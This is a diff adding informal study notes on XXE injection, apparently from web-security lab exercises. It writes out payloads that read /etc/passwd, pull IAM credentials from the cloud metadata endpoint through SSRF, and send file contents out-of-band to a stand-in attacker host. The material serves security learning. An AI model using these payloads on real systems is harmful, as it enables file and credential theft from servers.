@@ -1,0 +1,148 @@
+
+XML stands for "extensible markup language".
+XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML").
+he entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.
+The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional DOCTYPE element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
+
+
+
+XML allows custom entities to be defined within the DTD. For example:
+
+<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
+This definition means that any usage of the entity reference &myentity; within the XML document will be replaced with the defined value: "my entity value".
+
+The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:
+
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
+
+
+The URL can use the file:// protocol, and so external entities can be loaded from file. For example:
+
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
+
+
+
+XML external entity (XXE)
+
+ It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+ 
+ 
+ 
+ Lab: Exploiting XXE using external entities to retrieve files
+
+
+For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>381</productId></stockCheck>
+The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:
+
+Invalid product ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+
+Burp Repeater edit
+ 
+ <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
+ Replace
+ 
+ 
+ <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY var SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&var;</productId><storeId>2</storeId></stockCheck>
+
+sloved
+
+
+
+
+
+Exploiting XXE to perform SSRF attacks
+
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
+
+reples
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+
+but fund Invalid product ID then
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
+
+
+solved
+
+
+Lab: Blind XXE with out-of-band interaction
+
+Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
+Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+Replace the productId number with a reference to the external entity:
+
+&xxe;
+Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
+solved
+
+Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
+Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
+
+
+Exploiting blind XXE to exfiltrate data out-of-band
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+https://exploit-0a2500be04e6cd71806ffced01c50020.exploit-server.net/exploit
+
+
+
+
+Exploiting blind XXE to retrieve data via error messages
+
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+
+
+Finding hidden attack surface for XXE injection
+
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+Set the value of the productId parameter to:
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+
